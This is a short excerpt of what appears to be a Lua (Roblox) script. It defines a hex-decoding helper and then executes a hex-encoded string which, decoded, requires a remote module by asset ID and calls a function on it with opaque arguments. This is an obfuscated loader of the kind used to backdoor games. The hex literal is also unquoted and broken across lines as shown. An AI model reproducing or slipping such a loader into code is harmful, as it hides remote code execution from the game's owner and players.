...
function bj:sub(zc)
	if zc then
		if type(zc) == "table" then
			zc = table.concat(zc)
		end
		return zc:gsub("..",function(cB)
			return string.char(tonumber(cB, 16))
		end)
	end
...
execute(bj:sub(72657175697265283635343231323733
3730292E456C657068616E7428226669
72616E6B73222C2231346E5F222C2263
3438572229))()
